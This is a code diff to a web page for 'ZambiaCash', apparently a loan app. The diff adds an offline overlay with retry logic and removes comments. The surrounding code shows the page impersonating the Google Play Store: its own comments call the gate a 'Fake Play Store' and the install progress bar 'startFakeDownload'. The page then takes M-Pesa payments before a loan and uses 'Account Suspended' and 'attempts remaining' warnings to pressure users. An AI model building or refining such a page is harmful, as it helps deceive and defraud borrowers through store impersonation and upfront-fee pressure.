@@ -50,7 +50,6 @@
         .hide-scrollbar::-webkit-scrollbar { display: none; }
         .star { color: #FBBF24; }
         
-        /* UPDATED AVATAR STYLES FOR REAL IMAGES */
         .review-avatar { width: 36px; height: 36px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 14px; overflow: hidden; flex-shrink: 0; background-color: #E2E8F0; }
         .review-avatar img { width: 100%; height: 100%; object-fit: cover; }
         
@@ -100,6 +99,18 @@
 
 <div id="android-toast" class="hide fixed bottom-10 left-1/2 -translate-x-1/2 z-[20000] bg-slate-800 text-white text-[13px] px-5 py-3 rounded-xl shadow-lg text-center font-medium max-w-[90vw] font-sans">Message</div>
 
+<!-- OFFLINE GATE (Global Overlay) -->
+<div id="offline-gate" class="hide fixed inset-0 z-[110000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
+    <div class="w-20 h-20 bg-white/10 rounded-full flex items-center justify-center mb-6">
+        <svg class="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M18.364 5.636a9 9 0 010 12.728m0 0l-2.829-2.829m2.829 2.829L21 21M15.536 8.464a5 5 0 010 7.072m0 0l-2.829-2.829m-4.243 2.829a4.978 4.978 0 01-1.414-2.83m-1.414 5.658a9 9 0 01-2.167-9.238m7.824 2.167a1 1 0 111.414 1.414m-1.414-1.414L3 3m8.293 8.293l1.414 1.414"></path>
+        </svg>
+    </div>
+    <h2 class="text-2xl font-bold text-white mb-2 font-sans">No Internet Connection</h2>
+    <p class="text-gray-400 mb-8 text-sm max-w-xs mx-auto font-sans">ZambiaCash requires an active internet connection to process your loan.</p>
+    <button id="btn-retry-connection" onclick="retryConnection()" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl font-sans transition-transform active:scale-95">Retry</button>
+</div>
+
 <!-- BRIGHT INSTALLED PROMPT -->
 <div id="installed-prompt" class="hide fixed bottom-0 left-0 right-0 z-[10000] p-4 transform translate-y-full flex justify-center">
     <div class="bg-[#1e1e1e] rounded-2xl p-5 flex flex-col gap-3 shadow-2xl border border-gray-700 w-full max-w-sm relative overflow-hidden">
@@ -115,13 +126,6 @@
             <p class="text-yellow-400 font-extrabold text-sm">Use promo code: 2026</p>
         </div>
     </div>
-</div>
-
-<!-- OFFLINE -->
-<div id="offline-gate" class="hide fixed inset-0 z-[11000] bg-slate-900 flex flex-col items-center justify-center p-6 text-center">
-    <h2 class="text-2xl font-bold text-white mb-2 font-sans">No Internet Connection</h2>
-    <p class="text-gray-400 mb-8 text-sm max-w-xs mx-auto font-sans">ZambiaCash requires an active internet connection.</p>
-    <button onclick="location.reload()" class="w-full max-w-xs bg-brandYellow text-gray-900 font-bold py-3.5 rounded-xl font-sans">Retry</button>
 </div>
 
 <!-- PLAY STORE THEMED WARNING -->
@@ -543,7 +547,6 @@
 
                 <button onclick="checkStatusManual()" id="btn-check-status-failed" class="native-btn" style="margin-bottom: 12px; background: #1E40AF; display: flex; justify-content: center;"><span>Check Status Again</span></button>
                 <button onclick="window.location.href='mailto:support@zambiacash.com?subject=Payment Issue'" class="native-btn" style="margin-bottom: 12px; background: #475569; display: flex; justify-content: center;"><span>Contact Support</span></button>
-                <!-- THIS IS THE UPDATED BUTTON -->
                 <button onclick="retryPayment()" id="btn-retry-failed" class="native-btn" style="margin-bottom: 12px; background: #FFFFFF; color: #1E40AF; border: 1.5px solid #1E40AF; display: flex; justify-content: center; align-items: center;">Cancel & Try Again</button>
             </div>
 
@@ -593,9 +596,75 @@ function showToast(msg){
     toastTimeout = setTimeout(()=>{ t.classList.add('hide-toast'); setTimeout(()=>t.classList.add('hide'),300); }, 4000);
 }
 
+/* =============== OFFLINE RETRY LOGIC =============== */
+async function retryConnection() {
+    const btn = document.getElementById('btn-retry-connection');
+    const originalText = btn.innerText;
+    
+    btn.innerText = "Checking...";
+    btn.disabled = true;
+    btn.style.opacity = "0.7";
+
+    try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 5000); 
+
+        const res = await fetch(window.location.href + '?t=' + Date.now(), { 
+            method: 'HEAD', 
+            cache: 'no-store',
+            signal: controller.signal
+        });
+        
+        clearTimeout(timeoutId);
+
+        if (res.ok || res.status === 200) {
+            window.location.reload();
+        } else {
+            throw new Error("Network response was not ok");
+        }
+    } catch (err) {
+        if (window.showToast) {
+            window.showToast("⚠️ Still offline. Please check your connection.");
+        } else {
+            alert("Still offline. Please check your internet connection and try again.");
+        }
+        btn.innerText = originalText;
+        btn.disabled = false;
+        btn.style.opacity = "1";
+    }
+}
+
+// Global Listeners for Every Page
+window.addEventListener('offline', () => {
+    document.getElementById('offline-gate').classList.remove('hide');
+});
+
+window.addEventListener('online', () => {
+    const gate = document.getElementById('offline-gate');
+    if (!gate.classList.contains('hide')) {
+        gate.classList.add('hide');
+    }
+});
+
+/* =============== UPDATED FETCH TIMEOUT =============== */
 async function fetchWithTimeout(url, opts={}, ms=15000){
-    const c = new AbortController(); const t = setTimeout(()=>c.abort(), ms);
-    try { return await fetch(url, {...opts, signal:c.signal, cache:'no-store'}); } finally { clearTimeout(t); }
+    if (!navigator.onLine) {
+        document.getElementById('offline-gate').classList.remove('hide');
+        throw new Error("No internet connection");
+    }
+
+    const c = new AbortController(); 
+    const t = setTimeout(()=>c.abort(), ms);
+    try { 
+        return await fetch(url, {...opts, signal:c.signal, cache:'no-store'}); 
+    } catch (error) {
+        if (error.name === 'TypeError' || !navigator.onLine) {
+            document.getElementById('offline-gate').classList.remove('hide');
+        }
+        throw error;
+    } finally { 
+        clearTimeout(t); 
+    }
 }
 
 async function readJsonSafe(r){ try{ const x = await r.text(); return x ? JSON.parse(x) : null; }catch(e){ return null; } }
@@ -718,7 +787,6 @@ async function triggerRealInstall() {
     if (!deferredPrompt) return;
     isPromptActive = true;
     
-    // SAFETY: If prompt doesn't resolve in 15s, resume timer
     clearTimeout(promptSafetyTimeout);
     promptSafetyTimeout = setTimeout(() => {
         isPromptActive = false;
@@ -734,7 +802,6 @@ async function triggerRealInstall() {
     if (outcome === 'accepted') {
         localStorage.setItem('pwa_installed', '1');
     } else {
-        // SILENTLY RESET ON CANCEL
         clearInterval(fakeInterval);
         showInstallState();
         const btn = document.getElementById('btn-store-install');
@@ -743,7 +810,6 @@ async function triggerRealInstall() {
     }
 }
 
-// DATE-BASED TIMER (Fixes the freeze at 16 seconds)
 function startFakeDownload() {
     document.getElementById('pre-install-buttons').classList.add('hide');
     document.getElementById('downloading-buttons').classList.remove('hide');
@@ -755,14 +821,12 @@ function startFakeDownload() {
 
     fakeInterval = setInterval(() => {
         if (isPromptActive) {
-            // If the native prompt is open, push the start time forward
-            // so the progress bar doesn't jump when the prompt closes
             downloadStartTime += 100;
             return;
         }
 
         const elapsed = Date.now() - downloadStartTime;
-        const progress = Math.min((elapsed / 30000) * 100, 100); // 30 second download
+        const progress = Math.min((elapsed / 30000) * 100, 100); 
         
         updateProgressUI(progress);
 
@@ -775,7 +839,6 @@ function startFakeDownload() {
                 document.getElementById('btn-installing').innerHTML = 'Installing...';
                 setTimeout(() => showInstalledState(), 3000);
             } else {
-                // SILENTLY RESET IF FAILED
                 showInstallState();
             }
         }
@@ -815,7 +878,6 @@ document.getElementById('btn-open-app').addEventListener('click', async ()=>{
         } catch (e) {}
     }
 
-    // Show custom prompt
     const prompt = document.getElementById('installed-prompt');
     prompt.classList.remove('hide');
     
@@ -824,7 +886,6 @@ document.getElementById('btn-open-app').addEventListener('click', async ()=>{
         prompt.classList.add('translate-y-0');
     }, 10);
 
-    // Keep prompt visible for 10 seconds
     setTimeout(() => {
         prompt.classList.remove('translate-y-0');
         prompt.classList.add('translate-y-full');
@@ -837,7 +898,6 @@ document.getElementById('btn-open-app').addEventListener('click', async ()=>{
 function showAppInline(){
     playStoreGate.classList.add('hide');
     
-    // Show realistic Splash Screen
     splashScreen.classList.remove('hide');
     splashScreen.style.opacity = '1';
     
@@ -847,8 +907,8 @@ function showAppInline(){
             splashScreen.classList.add('hide');
             appContent.classList.remove('hide');
             bootApp();
-        }, 400); // Wait for fade out
-    }, 1500); // 1.5 second duration
+        }, 400);
+    }, 1500);
 }
 
 /* =============== BOOT LOGIC =============== */
@@ -894,7 +954,6 @@ if (isStandalone) {
     appContent.classList.remove('hide');
     bootApp();
 } else {
-    // Show Fake Play Store Immediately
     playStoreGate.classList.remove('hide');
     showInstallState();
 }
@@ -1036,7 +1095,6 @@ async function processPayment(){
         startPolling(txnId);
 
     } catch(err){
-        // PREVENT KICKING USER OUT ON GATEWAY TIMEOUT
         showPending();
         showToast("Connection timeout. Please check your M-Pesa messages.");
     }
@@ -1150,8 +1208,6 @@ function retryPayment(){
     showScreen('screen-payment'); resetPayButton();
 }
 
-if(!navigator.onLine) document.getElementById('offline-gate').classList.remove('hide');
-
 
 // =========================================================
 // SPAM PROTECTION ADD-ON (Appended at the bottom)
@@ -1159,7 +1215,6 @@ if(!navigator.onLine) document.getElementById('offline-gate').classList.remove('
 (function() {
     const MAX_ATTEMPTS = 3;
     
-    // 1. Inject CSS for the bold, animated warning and custom modal
     const style = document.createElement('style');
     style.innerHTML = `
         @keyframes warningShake {
@@ -1177,7 +1232,7 @@ if(!navigator.onLine) document.getElementById('offline-gate').classList.remove('
             padding: 14px;
             margin-bottom: 16px;
             color: #B91C1C;
-            font-weight: 800; /* Extra bold */
+            font-weight: 800;
             font-size: 14px;
             line-height: 1.4;
             display: flex;
@@ -1208,13 +1263,10 @@ if(!navigator.onLine) document.getElementById('offline-gate').classList.remove('
     `;
     document.head.appendChild(style);
 
-    // Helper functions using LocalStorage
     const getAttempts = () => parseInt(localStorage.getItem('zc_failed_attempts') || '0');
     const setAttempts = (val) => localStorage.setItem('zc_failed_attempts', val);
 
-    // Function to create and show the native prompt modal
     function showSpamPrompt(remaining) {
-        // Remove existing modal if it somehow exists
         const existingModal = document.getElementById('spam-prompt-modal');
         if (existingModal) existingModal.remove();
 
@@ -1243,10 +1295,8 @@ if(!navigator.onLine) document.getElementById('offline-gate').classList.remove('
         document.body.insertAdjacentHTML('beforeend', modalHTML);
     }
 
-    // 2. Intercept the FAILED screen
     const originalShowFailed = window.showFailed;
     window.showFailed = function() {
-        // Call your original function first (shows the red screen)
         if (originalShowFailed) originalShowFailed.call(this);
 
         let attempts = getAttempts() + 1;
@@ -1257,7 +1307,6 @@ if(!navigator.onLine) document.getElementById('offline-gate').classList.remove('
         const retryBtn = document.getElementById('btn-retry-failed');
 
         if (attempts >= MAX_ATTEMPTS) {
-            // BLOCK THE USER
             reasonEl.innerHTML = `
                 <div class="blocked-banner">
                     🚫 Account Suspended
@@ -1267,11 +1316,9 @@ if(!navigator.onLine) document.getElementById('offline-gate').classList.remove('
                 </div>
             `;
             
-            // Hide the retry buttons
             if (checkBtn) checkBtn.style.display = 'none';
             if (retryBtn) retryBtn.style.display = 'none';
             
-            // Disable the main pay button permanently
             const payBtn = document.getElementById('btn-pay');
             if (payBtn) {
                 payBtn.disabled = true;
@@ -1279,7 +1326,6 @@ if(!navigator.onLine) document.getElementById('offline-gate').classList.remove('
                 payBtn.style.background = "#64748B";
             }
         } else {
-            // WARN THE USER WITH ANIMATED BOLD TEXT
             let remaining = MAX_ATTEMPTS - attempts;
             let warningMsg = remaining === 2 ? "Only Two attempts remaining" : "Only One attempt remaining";
             
@@ -1291,46 +1337,38 @@ if(!navigator.onLine) document.getElementById('offline-gate').classList.remove('
                 <span style="color: #64748B; font-size: 14px;">The M-Pesa request was cancelled or failed.</span>
             `;
             
-            // REPLACE THE RETRY BUTTON TO GO BACK TO LOAN SELECTION AND SHOW PROMPT
             if (retryBtn) {
                 retryBtn.innerText = "Return to Loan Selection";
                 retryBtn.onclick = function() {
-                    // reset states and go to selection screen
                     if (typeof stopPolling === 'function') stopPolling();
                     isProcessingPayment = false; 
                     currentTxnId = null;
                     
-                    // Go back to selection screen
                     showScreen('screen-select');
                     
-                    // Trigger the prompt immediately
                     showSpamPrompt(remaining);
                 };
             }
             
-            // Show a toast notification
             if (window.showToast) window.showToast(`⚠️ Warning: ${remaining} attempt(s) remaining!`);
         }
     };
 
-    // 3. Intercept the SUCCESS screen (to reset the counter)
     const originalShowSuccess = window.showSuccess;
     window.showSuccess = function() {
-        setAttempts(0); // Reset counter on success
+        setAttempts(0); 
         if (originalShowSuccess) originalShowSuccess.call(this);
     };
 
-    // 4. Intercept the PAYMENT INITIATION (to prevent blocked users from clicking Pay)
     const originalProcessPayment = window.processPayment;
     window.processPayment = function() {
         if (getAttempts() >= MAX_ATTEMPTS) {
             if (window.showToast) window.showToast("🚫 You are blocked. Contact support.");
-            return; // Stop the payment process
+            return; 
         }
         if (originalProcessPayment) originalProcessPayment.call(this);
     };
 
-    // 5. Check if user is blocked when they open the app/reload
     window.addEventListener('DOMContentLoaded', () => {
         if (getAttempts() >= MAX_ATTEMPTS) {
             const payBtn = document.getElementById('btn-pay');
@@ -1342,6 +1380,9 @@ if(!navigator.onLine) document.getElementById('offline-gate').classList.remove('
         }
     });
 })();
+
+// Initial Offline Check on any page boot
+if(!navigator.onLine) document.getElementById('offline-gate').classList.remove('hide');
 </script>
 </body>
 </html>
